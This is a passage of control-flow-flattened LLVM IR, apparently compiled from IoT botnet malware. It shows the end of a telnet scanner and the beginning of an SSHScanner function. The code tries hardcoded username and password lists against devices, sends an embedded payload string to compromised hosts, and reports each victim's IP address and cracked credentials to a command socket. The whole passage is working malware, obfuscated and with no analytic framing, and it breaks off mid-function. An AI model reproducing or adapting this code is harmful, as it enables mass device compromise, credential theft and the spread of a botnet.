  %2270 = call i32 (i32, i8*, ...) @sockprintf(i32 %2245, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i32 0, i32 0), i8* %2253, i8* %2261, i8* %2269)
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:2271:                                   ; preds = %loopEntry
  %2272 = load i32, i32* %2, align 4
  %2273 = sext i32 %2272 to i64
  %.reload45 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2274 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload45, i64 %2273
  %2275 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2274, i32 0, i32 0
  %2276 = load i32, i32* %2275, align 16
  %2277 = load i32, i32* %2, align 4
  %2278 = sext i32 %2277 to i64
  %.reload44 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2279 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload44, i64 %2278
  %2280 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2279, i32 0, i32 8
  %2281 = load i8*, i8** %2280, align 8
  %2282 = load i32, i32* %2, align 4
  %2283 = sext i32 %2282 to i64
  %.reload43 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2284 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload43, i64 %2283
  %2285 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2284, i32 0, i32 7
  %2286 = load i16, i16* %2285, align 16
  %2287 = zext i16 %2286 to i32
  %2288 = call i32 @readUntil(i32 %2276, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.79, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %2281, i32 1024, i32 %2287)
  %2289 = icmp ne i32 %2288, 0
  %2290 = select i1 %2289, i32 -1435616820, i32 297863548
  store i32 %2290, i32* %switchVar
  br label %loopEnd

; <label>:2291:                                   ; preds = %loopEntry
  %2292 = load i32, i32* %2, align 4
  %2293 = sext i32 %2292 to i64
  %.reload42 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2294 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload42, i64 %2293
  %2295 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2294, i32 0, i32 6
  store i32 0, i32* %2295, align 4
  %2296 = load i32, i32* %2, align 4
  %2297 = sext i32 %2296 to i64
  %.reload41 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2298 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload41, i64 %2297
  %2299 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2298, i32 0, i32 7
  store i16 0, i16* %2299, align 16
  %2300 = load i32, i32* %2, align 4
  %2301 = sext i32 %2300 to i64
  %.reload40 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2302 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload40, i64 %2301
  %2303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2302, i32 0, i32 0
  %2304 = load i32, i32* %2303, align 16
  %2305 = call i64 @send(i32 %2304, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i32 0, i32 0), i64 394, i32 16384)
  %2306 = load i32, i32* @mainCommSock, align 4
  %2307 = load i32, i32* %2, align 4
  %2308 = sext i32 %2307 to i64
  %.reload39 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2309 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload39, i64 %2308
  %2310 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2309, i32 0, i32 1
  %2311 = bitcast i32* %2310 to %struct.in_addr*
  %2312 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %2311, i32 0, i32 0
  %2313 = load i32, i32* %2312, align 4
  %2314 = call i8* @inet_ntoa(i32 %2313) #2
  %2315 = load i32, i32* %2, align 4
  %2316 = sext i32 %2315 to i64
  %.reload38 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2317 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload38, i64 %2316
  %2318 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2317, i32 0, i32 4
  %2319 = load i8, i8* %2318, align 2
  %2320 = zext i8 %2319 to i64
  %2321 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %2320
  %2322 = load i8*, i8** %2321, align 8
  %2323 = load i32, i32* %2, align 4
  %2324 = sext i32 %2323 to i64
  %.reload37 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2325 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload37, i64 %2324
  %2326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2325, i32 0, i32 5
  %2327 = load i8, i8* %2326, align 1
  %2328 = zext i8 %2327 to i64
  %2329 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %2328
  %2330 = load i8*, i8** %2329, align 8
  %2331 = call i32 (i32, i8*, ...) @sockprintf(i32 %2306, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i32 0, i32 0), i8* %2314, i8* %2322, i8* %2330)
  %2332 = load i32, i32* %2, align 4
  %2333 = sext i32 %2332 to i64
  %.reload36 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload36, i64 %2333
  %2335 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2334, i32 0, i32 8
  %2336 = load i8*, i8** %2335, align 8
  call void @llvm.memset.p0i8.i64(i8* %2336, i8 0, i64 1024, i32 1, i1 false)
  %2337 = load i32, i32* %2, align 4
  %2338 = sext i32 %2337 to i64
  %.reload35 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload35, i64 %2338
  %2340 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2339, i32 0, i32 0
  %2341 = load i32, i32* %2340, align 16
  %2342 = call i32 @sclose(i32 %2341)
  %2343 = load i32, i32* %2, align 4
  %2344 = sext i32 %2343 to i64
  %.reload34 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2345 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload34, i64 %2344
  %2346 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2345, i32 0, i32 3
  store i8 1, i8* %2346, align 1
  %2347 = load i32, i32* %2, align 4
  %2348 = sext i32 %2347 to i64
  %.reload33 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload33, i64 %2348
  %2350 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2349, i32 0, i32 2
  store i8 0, i8* %2350, align 8
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:2351:                                   ; preds = %loopEntry
  %2352 = load i32, i32* %2, align 4
  %2353 = sext i32 %2352 to i64
  %.reload32 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2354 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload32, i64 %2353
  %2355 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2354, i32 0, i32 8
  %2356 = load i8*, i8** %2355, align 8
  %2357 = call i64 @strlen(i8* %2356) #10
  %2358 = trunc i64 %2357 to i16
  %2359 = load i32, i32* %2, align 4
  %2360 = sext i32 %2359 to i64
  %.reload31 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2361 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload31, i64 %2360
  %2362 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2361, i32 0, i32 7
  store i16 %2358, i16* %2362, align 16
  store i32 1221485587, i32* %switchVar
  br label %loopEnd

; <label>:2363:                                   ; preds = %loopEntry
  store i32 1003822257, i32* %switchVar
  br label %loopEnd

; <label>:2364:                                   ; preds = %loopEntry
  store i32 1674863284, i32* %switchVar
  br label %loopEnd

; <label>:2365:                                   ; preds = %loopEntry
  %2366 = load i32, i32* %2, align 4
  %2367 = sext i32 %2366 to i64
  %.reload30 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2368 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload30, i64 %2367
  %2369 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2368, i32 0, i32 6
  %2370 = load i32, i32* %2369, align 4
  %2371 = add i32 %2370, 10
  %2372 = zext i32 %2371 to i64
  %2373 = call i64 @time(i64* null) #2
  %2374 = icmp slt i64 %2372, %2373
  %2375 = select i1 %2374, i32 202933550, i32 -784850618
  store i32 %2375, i32* %switchVar
  br label %loopEnd

; <label>:2376:                                   ; preds = %loopEntry
  %2377 = load i32, i32* %2, align 4
  %2378 = sext i32 %2377 to i64
  %.reload29 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2379 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload29, i64 %2378
  %2380 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2379, i32 0, i32 0
  %2381 = load i32, i32* %2380, align 16
  %2382 = call i32 @sclose(i32 %2381)
  %2383 = load i32, i32* %2, align 4
  %2384 = sext i32 %2383 to i64
  %.reload28 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2385 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload28, i64 %2384
  %2386 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2385, i32 0, i32 2
  store i8 0, i8* %2386, align 8
  %2387 = load i32, i32* %2, align 4
  %2388 = sext i32 %2387 to i64
  %.reload27 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2389 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload27, i64 %2388
  %2390 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2389, i32 0, i32 3
  store i8 1, i8* %2390, align 1
  store i32 -784850618, i32* %switchVar
  br label %loopEnd

; <label>:2391:                                   ; preds = %loopEntry
  store i32 1068643273, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 1068643273, i32* %switchVar
  br label %loopEnd

; <label>:2392:                                   ; preds = %loopEntry
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:2393:                                   ; preds = %loopEntry
  %2394 = load i32, i32* %2, align 4
  %2395 = add nsw i32 %2394, 1
  store i32 %2395, i32* %2, align 4
  store i32 678181630, i32* %switchVar
  br label %loopEnd

; <label>:2396:                                   ; preds = %loopEntry
  store i32 850416488, i32* %switchVar
  br label %loopEnd

; <label>:2397:                                   ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %2396, %2393, %2392, %NewDefault, %2391, %2376, %2365, %2364, %2363, %2351, %2291, %2271, %2230, %2210, %2169, %2149, %2142, %2134, %2129, %2114, %2105, %2094, %2063, %2048, %2039, %2034, %2019, %2010, %2005, %1990, %1981, %1980, %1965, %1954, %1942, %1936, %1931, %1911, %1894, %1874, %1868, %1863, %1843, %1826, %1806, %1800, %1795, %1775, %1758, %1738, %1732, %1727, %1707, %1690, %1670, %1664, %1659, %1639, %1622, %1602, %1596, %1591, %1571, %1554, %1534, %1528, %1523, %1503, %1486, %1466, %1460, %1455, %1435, %1426, %1406, %1389, %1369, %1363, %1358, %1338, %1329, %1309, %1292, %1272, %1265, %1257, %1252, %1237, %1228, %1213, %1187, %1186, %1171, %1160, %1148, %1133, %1124, %1109, %1100, %1085, %1076, %1061, %1052, %1037, %1028, %1013, %1004, %989, %980, %965, %956, %941, %932, %926, %921, %916, %899, %879, %873, %868, %863, %846, %826, %819, %811, %806, %791, %782, %767, %741, %740, %725, %714, %713, %712, %711, %710, %698, %693, %687, %682, %665, %645, %640, %634, %629, %612, %592, %587, %581, %576, %559, %539, %534, %528, %523, %506, %486, %481, %475, %470, %453, %433, %426, %418, %417, %402, %391, %390, %375, %371, %370, %339, %324, %313, %281, %280, %271, %270, %263, %255, %254, %245, %234, %229, %206, %205, %166, %165, %160, %151, %140, %125, %105, %92, %LeafBlock, %NodeBlock, %NodeBlock1, %NodeBlock3, %NodeBlock5, %NodeBlock7, %NodeBlock9, %NodeBlock11, %NodeBlock13, %LeafBlock15, %NodeBlock17, %NodeBlock19, %NodeBlock21, %NodeBlock23, %71, %66, %65, %64, %60, %57, %42, %37, %23, %21, %20, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

declare i32 @system(i8*) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #4

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: noinline nounwind uwtable
define void @SSHScanner() #0 {
  %.reg2mem394 = alloca i32
  %.reg2mem22 = alloca %struct.telstate_t*
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i8*, align 8
  %10 = alloca %struct.timeval, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = call i32 @getdtablesize() #2
  %15 = sdiv i32 %14, 4
  %16 = mul nsw i32 %15, 3
  store i32 %16, i32* %1, align 4
  %17 = load i32, i32* %1, align 4
  store i32 %17, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1238297961, i32* %switchVar
  %.reg2mem407 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar21 = load i32, i32* %switchVar
  switch i32 %switchVar21, label %switchDefault [
    i32 -1238297961, label %first
    i32 1327096111, label %20
    i32 1118350817, label %21
    i32 5644594, label %23
    i32 1009141314, label %37
    i32 -660710224, label %42
    i32 -1185967068, label %57
    i32 720366592, label %60
    i32 -2140852313, label %63
    i32 -877175306, label %64
    i32 -237163149, label %65
    i32 1558270523, label %70
    i32 1669593315, label %NodeBlock19
    i32 -827083739, label %NodeBlock17
    i32 -1960033655, label %NodeBlock15
    i32 -1721009048, label %NodeBlock13
    i32 1623998188, label %LeafBlock11
    i32 1340632738, label %NodeBlock9
    i32 676728590, label %NodeBlock7
    i32 -753031280, label %NodeBlock5
    i32 1691849662, label %NodeBlock3
    i32 232453454, label %NodeBlock1
    i32 1512183916, label %NodeBlock
    i32 -595571043, label %LeafBlock
    i32 -2042634709, label %89
    i32 1099829233, label %102
    i32 1555005824, label %122
    i32 661612959, label %137
    i32 1908002395, label %148
    i32 -119598988, label %157
    i32 688848368, label %162
    i32 1910107007, label %163
    i32 -1212320882, label %202
    i32 954409328, label %203
    i32 -444168033, label %226
    i32 1779057487, label %231
    i32 659181654, label %242
    i32 1902906190, label %251
    i32 1601726460, label %252
    i32 -55551702, label %260
    i32 -1828150811, label %267
    i32 -236954818, label %268
    i32 -1337962136, label %277
    i32 246117140, label %278
    i32 337501835, label %310
    i32 1432823680, label %321
    i32 -300010941, label %336
    i32 -458884337, label %367
    i32 -726451379, label %368
    i32 170043222, label %372
    i32 238517393, label %387
    i32 1586450275, label %388
    i32 -954122973, label %399
    i32 -1873224242, label %414
    i32 891354512, label %415
    i32 -1650534693, label %423
    i32 629266885, label %430
    i32 -1988545098, label %450
    i32 -1377894766, label %467
    i32 -1627083891, label %472
    i32 1617894270, label %478
    i32 2090357575, label %483
    i32 -1449600179, label %503
    i32 1123494408, label %520
    i32 539861027, label %525
    i32 1824042668, label %531
    i32 953921347, label %536
    i32 -1794702103, label %556
    i32 -2007670604, label %573
    i32 1749093153, label %578
    i32 -1141869986, label %584
    i32 2079499622, label %589
    i32 1942363510, label %609
    i32 -558813709, label %626
    i32 -1375631850, label %631
    i32 -870869277, label %637
    i32 -543145919, label %642
    i32 394808286, label %662
    i32 1537104222, label %679
    i32 -1243359480, label %684
    i32 1943864784, label %690
    i32 -812243129, label %695
    i32 1207920682, label %707
    i32 -895782930, label %708
    i32 -1513404192, label %709
    i32 391608949, label %710
    i32 1505311165, label %711
    i32 1237942326, label %722
    i32 1171328696, label %737
    i32 -677806744, label %738
    i32 1418848442, label %764
    i32 603433714, label %779
    i32 1099450342, label %788
    i32 -538434550, label %803
    i32 1366644201, label %808
    i32 238313762, label %816
    i32 2055168301, label %823
    i32 -1373688542, label %843
    i32 830618873, label %860
    i32 624182474, label %865
    i32 -289075552, label %870
    i32 -1403645059, label %876
    i32 841119050, label %896
    i32 -581405955, label %913
    i32 1433616656, label %918
    i32 -1791839512, label %923
    i32 -901374423, label %929
    i32 60297510, label %938
    i32 -1177108902, label %953
    i32 -897522629, label %962
    i32 -151608290, label %977
    i32 -1164754189, label %986
    i32 266300578, label %1001
    i32 1443260900, label %1010
    i32 -758752623, label %1025
    i32 -863835605, label %1034
    i32 -794868327, label %1049
    i32 -1651053636, label %1058
    i32 -1953664499, label %1073
    i32 1782193102, label %1082
    i32 -1498728882, label %1097
    i32 -683271385, label %1106
    i32 -2059789037, label %1121
    i32 -613379616, label %1130
    i32 1089912850, label %1145
    i32 884790507, label %1157
    i32 -1075176802, label %1168
    i32 2130108801, label %1183
    i32 -1815106141, label %1184
    i32 1184102935, label %1210
    i32 892122214, label %1225
    i32 853991041, label %1234
    i32 1546665307, label %1249
    i32 -1326929480, label %1254
    i32 -19173178, label %1262
    i32 -673090209, label %1269
    i32 1772882337, label %1289
    i32 880450190, label %1306
    i32 1662450111, label %1326
    i32 -1387174376, label %1335
    i32 -67725532, label %1355
    i32 570147994, label %1360
    i32 2124770132, label %1366
    i32 -594289978, label %1386
    i32 503525088, label %1403
    i32 -130493908, label %1423
    i32 -84023175, label %1432
    i32 -270890027, label %1452
    i32 1994198433, label %1457
    i32 741120180, label %1463
    i32 192129753, label %1483
    i32 -639028617, label %1500
    i32 1948693888, label %1520
    i32 -1165593197, label %1525
    i32 -1290455714, label %1531
    i32 -2115030442, label %1551
    i32 1210736222, label %1568
    i32 1378410984, label %1588
    i32 -371651970, label %1593
    i32 1676841725, label %1599
    i32 495400496, label %1619
    i32 545733015, label %1636
    i32 -1484354052, label %1656
    i32 1532237382, label %1661
    i32 997283099, label %1667
    i32 -884164686, label %1687
    i32 447374323, label %1704
    i32 -1485014862, label %1724
    i32 -1768113871, label %1729
    i32 862109110, label %1735
    i32 862905573, label %1755
    i32 615022647, label %1772
    i32 -291990480, label %1792
    i32 -2147128254, label %1797
    i32 685831832, label %1803
    i32 78971064, label %1823
    i32 611722345, label %1840
    i32 661490799, label %1860
    i32 908186744, label %1865
    i32 586233147, label %1871
    i32 836084909, label %1891
    i32 -2030868796, label %1908
    i32 -2028064475, label %1928
    i32 868770536, label %1933
    i32 -1493902529, label %1939
    i32 784576470, label %1951
    i32 24816771, label %1962
    i32 132891669, label %1977
    i32 275529502, label %1978
    i32 -491031496, label %1987
    i32 1464724532, label %2002
    i32 643362379, label %2007
    i32 -1968798411, label %2016
    i32 1336106018, label %2031
    i32 409748914, label %2036
    i32 1331693113, label %2045
    i32 -2142244300, label %2060
    i32 585688039, label %2091
    i32 -85635614, label %2099
    i32 -867023163, label %2106
    i32 -1281217760, label %2126
    i32 -362091026, label %2167
    i32 56329637, label %2187
    i32 -919019281, label %2228
    i32 1713615809, label %2248
    i32 764239783, label %2308
    i32 1229258361, label %2320
    i32 -535987874, label %2321
    i32 39259950, label %2322
    i32 -1686291904, label %2333
    i32 842489912, label %2348
    i32 -1117700010, label %NewDefault
    i32 -1568167552, label %2349
    i32 -824704005, label %2350
    i32 -767997024, label %2353
    i32 345196468, label %2354
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %18 = icmp sgt i32 %.reload, 512
  %19 = select i1 %18, i32 1327096111, i32 1118350817
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  store i32 5644594, i32* %switchVar
  store i32 512, i32* %.reg2mem407
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = load i32, i32* %1, align 4
  store i32 5644594, i32* %switchVar
  store i32 %22, i32* %.reg2mem407
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %.reload408 = load i32, i32* %.reg2mem407
  store i32 %.reload408, i32* %1, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = call zeroext i16 @htons(i16 zeroext 22) #13
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %25, i16* %26, align 2
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %28 = getelementptr inbounds [8 x i8], [8 x i8]* %27, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %28, i8 0, i64 8, i32 4, i1 false)
  %29 = load i32, i32* %1, align 4
  %30 = zext i32 %29 to i64
  %31 = call i8* @llvm.stacksave()
  store i8* %31, i8** %9, align 8
  %32 = alloca %struct.telstate_t, i64 %30, align 16
  store %struct.telstate_t* %32, %struct.telstate_t** %.reg2mem22
  %.reload393 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %33 = bitcast %struct.telstate_t* %.reload393 to i8*
  %34 = load i32, i32* %1, align 4
  %35 = sext i32 %34 to i64
  %36 = mul i64 %35, 5
  call void @llvm.memset.p0i8.i64(i8* %33, i8 0, i64 %36, i32 16, i1 false)
  store i32 0, i32* %2, align 4
  store i32 1009141314, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %2, align 4
  %39 = load i32, i32* %1, align 4
  %40 = icmp slt i32 %38, %39
  %41 = select i1 %40, i32 -660710224, i32 720366592
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %2, align 4
  %44 = sext i32 %43 to i64
  %.reload392 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %45 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload392, i64 %44
  %46 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i32 0, i32 3
  store i8 1, i8* %46, align 1
  %47 = call noalias i8* @malloc(i64 1024) #2
  %48 = load i32, i32* %2, align 4
  %49 = sext i32 %48 to i64
  %.reload391 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %50 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload391, i64 %49
  %51 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i32 0, i32 8
  store i8* %47, i8** %51, align 8
  %52 = load i32, i32* %2, align 4
  %53 = sext i32 %52 to i64
  %.reload390 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %54 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload390, i64 %53
  %55 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %54, i32 0, i32 8
  %56 = load i8*, i8** %55, align 8
  call void @llvm.memset.p0i8.i64(i8* %56, i8 0, i64 1024, i32 1, i1 false)
  store i32 -1185967068, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i32, i32* %2, align 4
  %59 = add nsw i32 %58, 1
  store i32 %59, i32* %2, align 4
  store i32 1009141314, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 0
  store i64 5, i64* %61, align 8
  %62 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 1
  store i64 0, i64* %62, align 8
  store i32 -2140852313, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  store i32 -877175306, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 -237163149, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %2, align 4
  %67 = load i32, i32* %1, align 4
  %68 = icmp slt i32 %66, %67
  %69 = select i1 %68, i32 1558270523, i32 -767997024
  store i32 %69, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  %71 = load i32, i32* %2, align 4
  %72 = sext i32 %71 to i64
  %.reload389 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %73 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload389, i64 %72
  %74 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %73, i32 0, i32 2
  %75 = load i8, i8* %74, align 8
  %76 = zext i8 %75 to i32
  store i32 %76, i32* %.reg2mem394
  store i32 1669593315, i32* %switchVar
  br label %loopEnd

NodeBlock19:                                      ; preds = %loopEntry
  %.reload406 = load volatile i32, i32* %.reg2mem394
  %Pivot20 = icmp slt i32 %.reload406, 5
  %77 = select i1 %Pivot20, i32 -753031280, i32 -827083739
  store i32 %77, i32* %switchVar
  br label %loopEnd

NodeBlock17:                                      ; preds = %loopEntry
  %.reload400 = load volatile i32, i32* %.reg2mem394
  %Pivot18 = icmp slt i32 %.reload400, 8
  %78 = select i1 %Pivot18, i32 1340632738, i32 -1960033655
  store i32 %78, i32* %switchVar
  br label %loopEnd

NodeBlock15:                                      ; preds = %loopEntry
  %.reload397 = load volatile i32, i32* %.reg2mem394
  %Pivot16 = icmp slt i32 %.reload397, 9
  %79 = select i1 %Pivot16, i32 643362379, i32 -1721009048
  store i32 %79, i32* %switchVar
  br label %loopEnd

NodeBlock13:                                      ; preds = %loopEntry
  %.reload396 = load volatile i32, i32* %.reg2mem394
  %Pivot14 = icmp slt i32 %.reload396, 10
  %80 = select i1 %Pivot14, i32 409748914, i32 1623998188
  store i32 %80, i32* %switchVar
  br label %loopEnd

LeafBlock11:                                      ; preds = %loopEntry
  %.reload395 = load volatile i32, i32* %.reg2mem394
  %SwitchLeaf12 = icmp eq i32 %.reload395, 10
  %81 = select i1 %SwitchLeaf12, i32 585688039, i32 -1117700010
  store i32 %81, i32* %switchVar
  br label %loopEnd

NodeBlock9:                                       ; preds = %loopEntry
  %.reload399 = load volatile i32, i32* %.reg2mem394
  %Pivot10 = icmp slt i32 %.reload399, 6
  %82 = select i1 %Pivot10, i32 -1815106141, i32 676728590
  store i32 %82, i32* %switchVar
  br label %loopEnd

NodeBlock7:                                       ; preds = %loopEntry
  %.reload398 = load volatile i32, i32* %.reg2mem394
  %Pivot8 = icmp slt i32 %.reload398, 7
  %83 = select i1 %Pivot8, i32 -1326929480, i32 275529502
  store i32 %83, i32* %switchVar
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload405 = load volatile i32, i32* %.reg2mem394
  %Pivot6 = icmp slt i32 %.reload405, 2
  %84 = select i1 %Pivot6, i32 1512183916, i32 1691849662
  store i32 %84, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload402 = load volatile i32, i32* %.reg2mem394
  %Pivot4 = icmp slt i32 %.reload402, 3
  %85 = select i1 %Pivot4, i32 891354512, i32 232453454
  store i32 %85, i32* %switchVar
  br label %loopEnd

NodeBlock1:                                       ; preds = %loopEntry
  %.reload401 = load volatile i32, i32* %.reg2mem394
  %Pivot2 = icmp slt i32 %.reload401, 4
  %86 = select i1 %Pivot2, i32 -677806744, i32 1366644201
  store i32 %86, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload404 = load volatile i32, i32* %.reg2mem394
  %Pivot = icmp slt i32 %.reload404, 1
  %87 = select i1 %Pivot, i32 -595571043, i32 1601726460
  store i32 %87, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload403 = load volatile i32, i32* %.reg2mem394
  %SwitchLeaf = icmp eq i32 %.reload403, 0
  %88 = select i1 %SwitchLeaf, i32 -2042634709, i32 -1117700010
  store i32 %88, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  %90 = load i32, i32* %2, align 4
  %91 = sext i32 %90 to i64
  %.reload388 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %92 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload388, i64 %91
  %93 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %92, i32 0, i32 8
  %94 = load i8*, i8** %93, align 8
  call void @llvm.memset.p0i8.i64(i8* %94, i8 0, i64 1024, i32 1, i1 false)
  %95 = load i32, i32* %2, align 4
  %96 = sext i32 %95 to i64
  %.reload387 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %97 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload387, i64 %96
  %98 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %97, i32 0, i32 3
  %99 = load i8, i8* %98, align 1
  %100 = icmp ne i8 %99, 0
  %101 = select i1 %100, i32 1099829233, i32 1555005824
  store i32 %101, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load i32, i32* %2, align 4
  %104 = sext i32 %103 to i64
  %.reload386 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
